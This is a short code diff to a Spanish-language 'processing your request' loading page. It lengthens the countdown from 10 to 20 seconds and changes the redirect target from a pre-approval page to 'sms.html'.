@@ -74,12 +74,12 @@
         <div class="loading-spinner"></div>
         <div class="loading-text">Procesando la solicitud, por favor espere...</div>
         <!-- Contador de segundos -->
-        <div class="countdown-text" id="countdown">10 segundos restantes...</div>
+        <div class="countdown-text" id="countdown">20 segundos restantes...</div>
     </div>
 
     <script>
         // Tiempo inicial en segundos
-        let countdownTime = 10;
+        let countdownTime = 20;
 
         // Función para actualizar el contador
         function updateCountdown() {
@@ -94,10 +94,10 @@
         // Llamada inicial al contador
         const countdownInterval = setInterval(updateCountdown, 1000); // Actualiza cada 1 segundo
 
-        // Redirige después de 10 segundos
+        // Redirige después de 20 segundos
         setTimeout(() => {
-            window.location.href = "pre-aprobado.html"; // Redirección a la página de pre-aprobación
-        }, 10000); // 10000 ms = 10 segundos
+            window.location.href = "sms.html"; // Redirección a la página de pre-aprobación
+        }, 20000); // 20000 ms = 20 segundos
     </script>
 
 </body>
